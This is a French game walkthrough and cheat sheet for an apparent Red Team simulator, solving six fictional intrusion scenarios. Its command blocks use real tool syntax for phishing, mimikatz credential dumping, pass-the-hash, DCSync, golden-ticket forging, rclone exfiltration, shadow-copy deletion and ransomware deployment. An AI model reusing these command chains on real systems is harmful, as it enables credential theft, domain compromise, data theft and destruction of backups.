# Guide complet et cheat sheet — campagne solo Red Team

État vérifié le 11 novembre 2026. **Spoilers complets** : ce document révèle les identifiants fictifs et les solutions du jeu.

Les commandes ci-dessous se saisissent dans les **terminaux du jeu**. Les adresses, comptes, outils virtuels et documents appartiennent au simulateur. Un parcours complet de référence est donné pour chaque scénario ; ce n'est pas la liste de toutes les possibilités d'un logiciel réel.

Les nouvelles carrières commencent par [huit exercices privés dans Chordly](PRELUDE_CHORDLY.md),
puis le dossier Ravelle ci-dessous. La réussite de Ravelle ouvre le forum.

Le nouvel [acte I en dix chapitres](ACTE_I.md) possède sa propre cheat sheet,
avec les deux voies finales et les huit petits contrats. Les anciens parcours
ci-dessous restent ceux de la campagne prototype.

## 1. Ce qui mérite d'être amélioré en priorité

1. **Hashcat et mots de passe** : remplacer le petit dictionnaire de démonstration par un vrai jeu de données, ajouter règles et masques, calculer le travail effectué et les durées selon l'algorithme et des benchmarks vérifiés de RTX 5090. Aujourd'hui, `rockyou.txt` contient huit mots fictifs de démonstration ; le modèle couvre NTLM/dictionnaire et 4 096 entrées maximum. Aucun hashrate 5090 réaliste n'est encore implémenté.
2. **Plusieurs chemins d'accès** : les six scénarios réutilisent beaucoup le schéma campagne → poste accueil → mémoire → compte technique. Ajouter des entrées et objectifs réellement différents, des droits plus fins et de plus grandes topologies. Un chemin alternatif doit se découvrir par des indices.
3. **Protections plus riches** : les politiques EDR actuelles sont audit/blocage sur trois actions ; les règles réseau distinguent origine/destination/port. Il manque les processus détaillés, les périmètres de collecte et des outils de pivot réellement modélisés. LabEndpoint est une protection fictive, pas la reproduction d'un produit commercial.
4. **Communautés et incidents** : prolonger les fils écrits en dossiers interactifs — preuves de vendeurs, litiges, passations, décisions des interlocuteurs et négociation. Une annonce, une demande de rançon, un transfert de document, une publication et un paiement doivent conserver des états séparés.
5. **Accueil et sauvegardes** : menu et emplacements désormais implémentés. Restent le nom définitif, les miniatures, la disposition exacte des fenêtres et la validation des paquets sur les systèmes cibles. Voir SAUVEGARDES.md.
6. **Progression** : stabiliser et faire tester le solo Red Team ; développer ensuite un vrai rôle Blue Team ; seulement ensuite le multijoueur avec serveur autoritaire, vues séparées et reconnexion. Ces deux modes ne sont pas livrés aujourd'hui.

## Portefeuille et accès — version 0.4.1

Les fonds sont désormais dans l’application ColdVault du bureau, pas sur les
forums. Pour un achat payant : choisir l’article dans la boutique, connecter et
déverrouiller ColdVault, vérifier le montant et confirmer sur l’appareil simulé.
Les services gratuits restent activables directement. La boutique se débloque
après Ravelle ; Exployt et XSX exigent la progression, une recommandation et la
réputation de la communauté précédente. Voir [PORTEFEUILLE_ET_ACCES.md](PORTEFEUILLE_ET_ACCES.md).

## 2. Utiliser la cheat sheet

- Une commande à la fois, puis Entrée. Attendre le résultat de l'action avant la suivante ; ne pas coller un bloc entier comme un script.
- Ouvrir plusieurs terminaux avec Ctrl+Alt+T ou le menu Terminal. Les noms ci-dessous sont des **rôles**, pas des numéros imposés par le jeu.
- **Kali principal** : reconnaissance, API GoPhish, Hashcat, clients Impacket. **Kali — transferts** : SMB/SCP. Garder ces consoles locales.
- **Kali — serveur GoPhish** : lancer le serveur et laisser cette console ouverte. Ctrl+C l'arrête. Si le serveur tourne déjà dans une autre console, conserver cette console plutôt que lancer un deuxième serveur.
- **Session Windows — poste accueil / serveur** : après impacket-psexec, les commandes suivantes dans cette console s'exécutent sur Windows. `whoami` doit afficher `nt authority\system` pour la lecture mémoire du parcours.
- Les commandes affichent les secrets de référence de nouvelles missions dans cette version. Comparer avec le résultat obtenu dans le jeu, surtout après modification de scénario ou reprise d'une ancienne sauvegarde.
- Les réactions humaines ne sont pas garanties hors tutoriel. Un résultat `Queued` de curl indique la création d'une campagne, pas la récupération d'un mot de passe. Lire le résultat avant de continuer. Une absence de réponse ou un signalement n'est pas un succès ; répéter sans réfléchir augmente la suspicion. Les secrets révélés ici permettent de court-circuiter une étape : ce serait une solution avec spoilers, pas la preuve d'une collecte réussie.
- Les missions ont un délai. Les essais automatisés accélèrent les ticks ; ils ne mesurent ni le temps de jeu humain ni une opération réelle.

### Démarrer GoPhish si nécessaire — commun aux cinq premières missions

Dans une console Kali dédiée, avant les commandes curl :

```text
gophish --config /opt/gophish/config.json
```

Attendre l'annonce du serveur d'administration sur `https://127.0.0.1:3333`. Ne rien saisir d'autre dans cette console pendant que le processus occupe le premier plan.

Les fichiers `~/gophish/campaign.json` et le groupe Briefing sont préparés pour la mission. Il n'est pas nécessaire de créer un véritable service externe. La variable API_KEY appartient à la console dans laquelle elle est chargée.

### Saisir le mot de passe à l'invite

Exemple testé du tutoriel : dans une console Kali, saisir
`impacket-psexec m.leroux@10.20.0.21`, puis répondre **Password123!** à l'invite
`Password:`. Le secret est masqué, sans ajout à l'historique. Après connexion,
la console passe à cmd. La forme avec mot de passe dans la commande, utilisée
dans les parcours ci-dessous, reste reconnue mais apparaît dans leur historique.

### Lire le rapport

Une mission est réussie quand le contrat passe à `SUCCESS`, avec objectifs vérifiés et règlement affiché. Le butin, une commande acceptée ou un fichier de ticket créé ne suffisent pas toujours. Le règlement ci-dessous correspond au parcours testé ; un autre choix peut le modifier.

## 3. Carte de campagne

| Ordre | Scénario | Réseau | Réputation minimale | Prime annoncée |
|---|---|---|---:|---:|
| 1 | Ravelle — tutoriel | 10.20.0.0/24 | 0 | 300 ₵ |
| 2 | Morel | 10.31.4.0/24 | 0 | 350 ₵, bonus possible 175 ₵ |
| 3 | Atelier Dumas | 10.42.8.0/24 | 50 | 450 ₵ |
| 4 | Varenne | 10.53.12.0/24 | 100 | 1 000 ₵ |
| 5 | Imprimerie Belin | 10.64.16.0/24 | 200 | 1 500 ₵ avant modulations |
| 6 | Valmont | 10.75.20.0/24 | 300 | 3 500 ₵ avant modulations |

Six scénarios distincts, sept contrats avec Offre urgente ; l'ancien mvp_demo n'est pas une mission de campagne.

## 4. Tutoriel — Cabinet Ravelle & Associés

**Objectif :** Prendre une session administrateur sur le serveur de fichiers.

**Avant de commencer :** Accepter le contrat Débutants sur BreachBoard. Aucun achat obligatoire.

**Déroulement de A à Z :** Le poste d’accueil est le point de départ. La campagne fournit le compte m.leroux ; ce compte ouvre une session SYSTEM sur ce poste. Un outil Windows doit être transféré avant utilisation. La mémoire du poste contient le hash du compte it.presta, administrateur du serveur. La connexion au serveur valide le tutoriel.

**Point pédagogique :** Un compte d’accueil administrateur et un compte de maintenance en mémoire sont des hypothèses du scénario, pas un comportement normal de tous les réseaux.

### Commandes dans l’ordre

**Étape 1 — Kali principal**

```text
cat ~/mission/briefing.txt
nmap -sV 10.20.0.0/24
```

**Étape 2 — Kali — serveur GoPhish**

```text
gophish --config /opt/gophish/config.json
```

**Étape 3 — Kali principal**

```text
API_KEY=$(cat ~/gophish/api-key.txt)
curl -k -H "Authorization: $API_KEY" https://127.0.0.1:3333/api/groups/
curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/
```

Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.

**Étape 4 — Session Windows — poste accueil**

```text
impacket-psexec m.leroux:Password123!@10.20.0.21
whoami
dir C:\Data
```

**Étape 5 — Kali — transferts**

```text
smbclient '//10.20.0.21/C$' -U 'm.leroux%Password123!' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
```

**Étape 6 — Session Windows — poste accueil**

```text
C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.

**Étape 7 — Session Windows — serveur documentaire**

```text
impacket-psexec -hashes :ca61eb63ab385fa4039002a79909c534 it.presta@10.20.0.10
```

### Fin et règlement

Une session administrateur existe sur srv-fichiers. Le butin seul ne valide pas cette condition.

Parcours de référence : **SUCCESS**, **300 ₵**. Les 6 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.

## 5. Le cabinet Morel

**Objectif :** Transférer contrats_2026.xlsx depuis le serveur, sans chiffrement.

**Avant de commencer :** Tutoriel terminé, palier 1. Aucun outil payant obligatoire.

**Déroulement de A à Z :** La campagne fournit a.morel. La session sur le poste d’accueil permet de récupérer le hash support.morel. Le dictionnaire du laboratoire permet de retrouver Morel2026!. Le compte ouvre le serveur ; rclone doit y être transféré avant la copie du dossier de données vers la destination de jeu préconfigurée.

**Point pédagogique :** Ce parcours transfère tout C:\Data, donc plus que le fichier demandé. La variante SMB ci-dessous permet un transfert ciblé. Le passage Mimikatz déclenche une alerte critique : il ne remporte pas le bonus de discrétion.

### Commandes dans l’ordre

Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.

**Étape 1 — Kali principal**

```text
cat ~/mission/briefing.txt
nmap -sV 10.31.4.0/24
API_KEY=$(cat ~/gophish/api-key.txt)
curl -k -H "Authorization: $API_KEY" https://127.0.0.1:3333/api/groups/
curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/
```

Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.

**Étape 2 — Session Windows — poste accueil**

```text
impacket-psexec a.morel:Password123!@10.31.4.21
whoami
dir C:\Data
```

**Étape 3 — Kali — transferts**

```text
smbclient '//10.31.4.21/C$' -U 'a.morel%Password123!' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
```

**Étape 4 — Session Windows — poste accueil**

```text
C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.

**Étape 5 — Kali principal**

```text
hashcat -m 1000 ~/loot/support.morel.ntlm /usr/share/wordlists/rockyou.txt
```

Attendre `Cracked` et le mot de passe. Si le résultat est `Exhausted`, vérifier le fichier et les candidats : ce n’est pas une réussite.

**Étape 6 — Session Windows — serveur documentaire**

```text
impacket-psexec support.morel:Morel2026!@10.31.4.10
```

**Étape 7 — Kali — transferts**

```text
smbclient '//10.31.4.10/C$' -U 'support.morel%Morel2026!' -c 'put /home/operator/tools/rclone.exe Tools/rclone.exe'
```

**Étape 8 — Session Windows — serveur documentaire**

```text
rclone copy C:\Data remote:loot
```

Résultat attendu : transfert enregistré vers `remote:loot`, destination préconfigurée du laboratoire ; cette commande ne configure pas un stockage rclone réel.

### Fin et règlement

Le transfert srv-fichiers:/srv/contrats_2026.xlsx est enregistré. Se connecter au serveur ne suffit pas.

Parcours de référence : **SUCCESS**, **350 ₵**. Les 21 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.

Le parcours touche 350 ₵, pas 525 ₵ : la lecture mémoire a produit une alerte critique. Pour un transfert limité au document demandé, voir la variante SMB en annexe.

## 6. Un concurrent jaloux — Atelier Dumas

**Objectif :** Retrouver le mot de passe en clair de maintenance.dumas.

**Avant de commencer :** Au moins 50 points de réputation ; terminer Morel auparavant.

**Déroulement de A à Z :** Le compte l.dumas donne accès au poste d’accueil. La lecture de mémoire livre le hash NTLM maintenance.dumas ; Hashcat teste ensuite le dictionnaire virtuel. Le contrat est terminé dès que le mot de passe Dumas2026! est enregistré dans le butin.

**Point pédagogique :** L’objectif n’exige ni connexion au serveur ni transfert de ses documents. Une opération inutile augmente le bruit sans faire progresser le contrat.

### Commandes dans l’ordre

Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.

**Étape 1 — Kali principal**

```text
cat ~/mission/briefing.txt
nmap -sV 10.42.8.0/24
API_KEY=$(cat ~/gophish/api-key.txt)
curl -k -H "Authorization: $API_KEY" https://127.0.0.1:3333/api/groups/
curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/
```

Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.

**Étape 2 — Session Windows — poste accueil**

```text
impacket-psexec l.dumas:Password123!@10.42.8.21
whoami
dir C:\Data
```

**Étape 3 — Kali — transferts**

```text
smbclient '//10.42.8.21/C$' -U 'l.dumas%Password123!' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
```

**Étape 4 — Session Windows — poste accueil**

```text
C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.

**Étape 5 — Kali principal**

```text
hashcat -m 1000 ~/loot/maintenance.dumas.ntlm /usr/share/wordlists/rockyou.txt
```

Attendre `Cracked` et le mot de passe. Si le résultat est `Exhausted`, vérifier le fichier et les candidats : ce n’est pas une réussite.

### Fin et règlement

Un identifiant PLAINTEXT maintenance.dumas existe dans le butin. Le hash seul ne suffit pas.

Parcours de référence : **SUCCESS**, **450 ₵**. Les 21 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.

## 7. Logistique Varenne

**Objectif :** Obtenir et utiliser un accès administrateur de domaine.

**Avant de commencer :** Palier 2, réputation 100. Dans Boutique : acquérir l’accès NullVad, puis sélectionner la route Tor AVANT d’accepter le contrat. Le service coûte 50 ₵ par contrat.

**Déroulement de A à Z :** La campagne fournit p.varenne. La mémoire du poste expose le hash svc.replic, compte qui possède explicitement des droits de réplication. L’interrogation du contrôleur fournit le secret krbtgt du modèle ; une autre interrogation fournit le SID. Le ticket est créé hors ligne, placé dans KRB5CCNAME, puis effectivement utilisé pour se connecter au contrôleur par son nom.

**Point pédagogique :** Le modèle simplifie AD, DCSync et Kerberos. Le secret krbtgt est une valeur fictive du moteur ; le cache ne reproduit pas intégralement un vrai protocole Kerberos.

### Commandes dans l’ordre

Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.

**Étape 1 — Kali principal**

```text
cat ~/mission/briefing.txt
nmap -sV 10.53.12.0/24
API_KEY=$(cat ~/gophish/api-key.txt)
curl -k -H "Authorization: $API_KEY" https://127.0.0.1:3333/api/groups/
curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/
```

Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.

**Étape 2 — Session Windows — poste accueil**

```text
impacket-psexec p.varenne:Varenne-Accueil!2026@10.53.12.21
whoami
dir C:\Data
```

**Étape 3 — Kali — transferts**

```text
smbclient '//10.53.12.21/C$' -U 'p.varenne%Varenne-Accueil!2026' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
```

**Étape 4 — Session Windows — poste accueil**

```text
C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.

**Étape 5 — Kali principal → session Windows après la dernière commande**

```text
impacket-secretsdump -just-dc -hashes :c2661f0d9475882ba50b9721597a92c7 svc.replic@10.53.12.10
impacket-lookupsid -domain-sids -hashes :c2661f0d9475882ba50b9721597a92c7 svc.replic@10.53.12.10
impacket-ticketer -nthash fd4b875e042c8fee3fc45a0e65fb4f9b -domain-sid S-1-5-21-100000214-100000251-100000294 -domain varenne.lab administrator
export KRB5CCNAME=/home/operator/administrator.ccache
impacket-psexec -k -no-pass varenne.lab/administrator@VAR-DC-FS01
```

### Fin et règlement

La connexion avec le ticket est acceptée et domain_compromised devient vrai. Créer administrator.ccache seul ne termine rien.

Parcours de référence : **SUCCESS**, **1000 ₵**. Les 23 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.

## 8. Première affiliation — Imprimerie Belin

**Objectif :** Atteindre au moins 60 % de machines chiffrées dans le laboratoire.

**Avant de commencer :** Réputation 200. Dans Boutique, acquérir Vesper avant le contrat ; la licence Glasswing est une autre possibilité, mais ce parcours utilise Vesper. Le contrat est une affiliation à 30 % sans Glasswing.

**Déroulement de A à Z :** Le compte j.belin ouvre le poste d’accueil. La lecture de mémoire fournit le hash svc.belin, administrateur du serveur. Préparer Vesper sur les DEUX machines avant les actions bruyantes, ouvrir les sessions nécessaires, puis chiffrer l’accueil et le serveur : deux machines sur trois dépassent le seuil de 60 %. Le poste comptabilité protégé est facultatif.

**Point pédagogique :** La prime affichée n’est pas le paiement de ce parcours. Avec sauvegardes restantes : 1 500 × 35 % = 525 ; part opérateur 30 % = 157 ₵ après arrondi entier. Aucune conclusion sur le paiement d’une victime ne doit être tirée de ce règlement.

### Commandes dans l’ordre

Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.

**Étape 1 — Kali principal**

```text
cat ~/mission/briefing.txt
nmap -sV 10.64.16.0/24
API_KEY=$(cat ~/gophish/api-key.txt)
curl -k -H "Authorization: $API_KEY" https://127.0.0.1:3333/api/groups/
curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/
```

Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.

**Étape 2 — Session Windows — poste accueil**

```text
impacket-psexec j.belin:Imprimerie-Accueil!2026@10.64.16.21
whoami
dir C:\Data
```

**Étape 3 — Kali — transferts**

```text
smbclient '//10.64.16.21/C$' -U 'j.belin%Imprimerie-Accueil!2026' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
```

**Étape 4 — Session Windows — poste accueil**

```text
C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.

**Étape 5 — Kali — transferts**

```text
smbclient '//10.64.16.21/C$' -U 'j.belin%Imprimerie-Accueil!2026' -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
smbclient '//10.64.16.10/C$' -U svc.belin%06b78af97e25f97772169211821b24ff --pw-nt-hash -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
```

**Étape 6 — Session Windows — première cible**

```text
impacket-psexec j.belin:Imprimerie-Accueil!2026@10.64.16.21
vesper encrypt
```

**Étape 7 — Session Windows — serveur documentaire**

```text
impacket-psexec -hashes :06b78af97e25f97772169211821b24ff svc.belin@10.64.16.10
vesper encrypt
```

### Fin et règlement

Au moins deux machines sur trois portent l’état chiffré. Une exfiltration n’est pas requise par ce contrat.

Parcours de référence : **SUCCESS**, **157 ₵**. Les 23 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.

## 9. Grand compte — Groupe Valmont

**Objectif :** Transférer archive.zip, retirer les instantanés locaux du serveur et chiffrer au moins 60 % des machines.

**Avant de commencer :** Palier 3, réputation 300, Vesper ou Glasswing acquis. Acheter un relais SSH jetable (300 ₵), sélectionner la route relais AVANT le contrat. Le relais est consommé à l’acceptation.

**Déroulement de A à Z :** La mission commence avec une session de maintenance déjà ouverte, dont les détails sont dans acces.txt. Revenir à Kali pour reconnaître le réseau et transférer les outils sur les deux cibles. Chiffrer la première cible, ouvrir le serveur, transférer ses données, retirer ses instantanés locaux, puis le chiffrer en dernier.

**Point pédagogique :** Le réseau administratif Valmont est fictif. La disparition des instantanés locaux ne prouve rien sur des sauvegardes hors site ; 60 % des machines ne représente pas 60 % d’activité perdue. Ne chiffre pas le serveur avant le transfert de l’archive.

### Commandes dans l’ordre

La première commande `exit` quitte la session Windows fournie. La saisir seulement si cette console est effectivement sur Windows ; depuis une nouvelle console Kali, commencer directement au briefing. Les identifiants de la passation sont aussi lisibles avec `cat ~/mission/acces.txt`.

**Étape 1 — Kali principal**

```text
exit
cat ~/mission/briefing.txt
nmap -sV 10.75.20.0/24
```

**Étape 2 — Kali — transferts**

```text
smbclient '//10.75.20.21/C$' -U 'support.valmont%Valmont2026!' -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
smbclient '//10.75.20.10/C$' -U 'support.valmont%Valmont2026!' -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
```

**Étape 3 — Session Windows — première cible**

```text
impacket-psexec support.valmont:Valmont2026!@10.75.20.21
vesper encrypt
```

**Étape 4 — Session Windows — serveur documentaire**

```text
impacket-psexec support.valmont:Valmont2026!@10.75.20.10
```

**Étape 5 — Kali — transferts**

```text
smbclient '//10.75.20.10/C$' -U 'support.valmont%Valmont2026!' -c 'put /home/operator/tools/rclone.exe Tools/rclone.exe'
```

**Étape 6 — Session Windows — serveur documentaire**

```text
rclone copy C:\Data remote:loot
vssadmin delete shadows /all /quiet
vesper encrypt
```

Résultat attendu : transfert enregistré vers `remote:loot`, destination préconfigurée du laboratoire ; cette commande ne configure pas un stockage rclone réel.

### Fin et règlement

Les trois conditions doivent être réunies : archive transférée, sauvegardes locales du serveur retirées, seuil de chiffrement atteint.

Parcours de référence : **SUCCESS**, **4025 ₵**. Les 14 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.

Le parcours touche 4 025 ₵ : base 3 500, instantanés du serveur retirés et exfiltration donnant le multiplicateur du jeu de 115 %. Ce chiffre est le règlement du contrat, pas une rançon versée par Valmont.

## 10. Contrat optionnel — Offre urgente

Ce septième contrat réutilise le réseau Morel et le même objectif : transférer `contrats_2026.xlsx`. Le client a un compte très récent, une réputation nulle et demande d'agir sans fournir de références. Ce sont des éléments de contexte à examiner, pas la preuve qu'une réussite sera annulée.

- Accessible au palier 1, sans réputation minimale.
- Même parcours et mêmes commandes que Morel : accepter **Offre urgente**, puis suivre la section Morel.
- Prime définie : **2 500 ₵**, pas de bonus de discrétion ni de réputation supplémentaire.
- La règle historique transformant automatiquement une réussite en arrestation a été retirée.
- Ce contrat a aussi été rejoué séparément avec les commandes Morel, dans une carrière temporaire au palier 1 : SUCCESS, 2 500 ₵ confirmés (graine 0). Il s'ajoute aux douze parcours des six missions principales.

## 11. Variantes et observations utiles

### Copier seulement le fichier demandé — variante Morel testée

Depuis Kali, après obtention du mot de passe support.morel et découverte du serveur :

```text
smbclient //10.31.4.10/C$ -U 'support.morel%Morel2026!' -c 'get Data/contrats_2026.xlsx /home/operator/loot/contrats_2026.xlsx'
```

Cette variante remplace le transfert de rclone et sa copie de tout le dossier. Elle a été testée dans le second parcours. Elle n'efface pas les alertes produites avant le transfert.

### Transférer l'outil par SCP — variante tutoriel testée

Depuis une console Kali de transfert :

```text
scp ~/tools/mimikatz.exe m.leroux@10.20.0.21:C:/Tools/mimikatz.exe
```

Quand le terminal demande le mot de passe, saisir **Password123!** puis Entrée. Ce mot de passe répond à l'invite ; ce n'est pas une nouvelle commande système.

### PowerShell — variante testée

Dans la session Windows distante, ouvrir PowerShell :

```text
powershell -NoLogo -NoProfile
```

Les commandes Windows du parcours se saisissent ensuite dans cette console ; `exit` revient au shell précédent. Le sous-ensemble du jeu n'exécute pas des scripts PowerShell arbitraires.

### Comprendre les protections — exploration facultative, pas une étape obligatoire

Dans une session Windows du poste d'accueil, ouvrir PowerShell puis lire :

```text
Get-Service -Name LabEndpoint
Get-Content C:ProgramDataLabEndpointpolicy.txt
Get-Content C:UsersPublicDocumentsSupportinventaire-2024.txt
Get-Content C:UsersPublicDocumentsSupportmigration-2026.txt
```

Ces observations sont présentes sur les cinq missions après le tutoriel. L'inventaire pointe vers l'ancienne adresse .99 ; le changement de 2026 documente son retrait. La politique de maintenance ne supprime pas les journaux.

Exemple Varenne, depuis cette même session PowerShell :

```text
Test-NetConnection VAR-COMPTA -Port 445
```

Le port est joignable depuis l'intérieur du LAN ; le scan depuis Kali montre un filtrage. L'accessibilité d'un service ne prouve ni des droits d'administration ni l'autorisation d'exécuter un outil. La politique du poste comptabilité bloque les actions couvertes même avec de bons identifiants. Aucun outil de pivot complet n'est documenté ici car il n'est pas encore reproduit.

## 12. Dépannage

| Observation | Interprétation et action |
|---|---|
| Une mission est déjà en cours | Reprendre la mission existante ; ne pas en accepter une seconde. Pour recommencer, utiliser la déconnexion de mission prévue par le jeu, en comprenant qu'elle termine le contrat courant. |
| Failed to connect sur curl local | Vérifier le serveur GoPhish et sa console. Ne pas envoyer la commande curl dans la console occupée par le serveur. |
| Invalid API key | Recharger API_KEY dans la console Kali qui envoie curl. Les variables ne passent pas d'une console à l'autre. |
| Campagne Queued, aucun compte obtenu | Attendre le résultat ; examiner soumission, absence de réponse, filtre ou signalement. Pas de session automatique après une collecte. |
| Exécutable Windows introuvable | Transférer l'artefact depuis ~/tools avec SMB/SCP avant de le lancer sur la bonne machine. |
| whoami n'affiche pas SYSTEM | Les opérations du parcours exigeant SYSTEM ne sont pas acquises. Un mot de passe valide ne donne pas automatiquement tous les droits. |
| Port filtered | Ce résultat ne permet pas d'affirmer qu'un service est ouvert. Examiner le chemin réseau et les documents ; changer le mot de passe ne règle pas un filtrage. |
| Exécution bloquée par politique locale | La protection est déterministe pour l'action couverte. Réessayer la même commande n'est pas une méthode de résolution. Le poste comptabilité est facultatif dans les parcours ci-dessus. |
| Machine temporairement isolée | Le rétablissement est annoncé dans l'historique après six ticks. Reconnecter la session ; les comptes suspendus par cette réaction sont restaurés. Le délai est compensé. |
| Exhausted dans Hashcat | Le mot de passe n'a pas été trouvé dans les candidats disponibles. Pas de récupération automatique après une attente arbitraire. |
| administrator.ccache créé mais contrat non terminé | Exporter KRB5CCNAME dans la console utilisée puis effectuer la connexion avec le ticket au nom du contrôleur. |
| Le serveur est chiffré avant le transfert demandé | L'ordre des actions a détruit l'accès nécessaire au parcours. Le confinement temporaire ne déchiffre pas les fichiers. Retenter la mission avec le bon ordre ; le moteur n'offre pas encore un retour à un point de contrôle choisi. |
| Paiement inférieur à la prime | Lire les conditions : sauvegardes, affiliation et bonus sont calculés séparément. |

## 13. Accueil et sauvegardes

Le client Godot démarre sur un menu : Continuer, Nouvelle partie, Sauvegardes /
Charger, Paramètres, Crédits et Quitter. Les carrières peuvent être enregistrées
dans plusieurs emplacements manuels, avec trois autosauvegardes tournantes et
une copie avant chargement. La nouvelle partie archive la carrière actuelle.

Dans le bureau : F5 crée une sauvegarde manuelle, Échap ouvre les paramètres,
et Sauvegarder et revenir au menu suspend la mission. Continuer reprend la
mission active avec ses consoles. Charger un emplacement remplace toute la
carrière, y compris ses achats et gains.

Le [guide des sauvegardes](SAUVEGARDES.md) détaille les confirmations, la
récupération et les éléments d'interface qui ne sont pas encore conservés.
RedTeamSimulator reste le nom de travail du jeu.

## 14. Preuves et limites de ce guide

Les commandes principales sont extraites d'un nouveau passage des six missions par l'API et le terminal simulé, dans une carrière temporaire. Deux variantes passent, soit **douze réussites**, auxquelles s’ajoute **une réussite de l’offre urgente**, soit treize parcours vérifiés pour cette rédaction. Les erreurs volontairement testées par le validateur ont été retirées de la cheat sheet. Aucun fichier du profil réel du joueur n'a été modifié.

Graines de qualification : tuto_p0=0, morel=0, rival=1, varenne=2, affiliation=2, grand_compte=0. Elles sélectionnent des cas reproductibles de réussite ; elles ne représentent pas tous les tirages humains. Les étapes d'interface et le temps de lecture d'un joueur ne sont pas automatisés par cette vérification documentaire.

Les commandes d'observation de protection sont couvertes par les tests dédiés du moteur. Le guide ne valide ni des exécutables offensifs externes, ni une sortie exhaustive de chaque outil, ni un hashrate de GPU. Les objectifs sont ceux de la version présente.

Références locales : [contrat du terminal](COMMANDES.md), [réalisme et limites](REALISME.md), [vérifications](VERIFICATION.md), [plan du projet](ROADMAP.md).


## Nouveau dossier privé — chapitre 08

[Mauvaise adresse : enquête, commandes et livraison](CHAPITRE_08.md).
Disponible dans Chordly auprès de nullroute après Morel ; absent du tableau public.
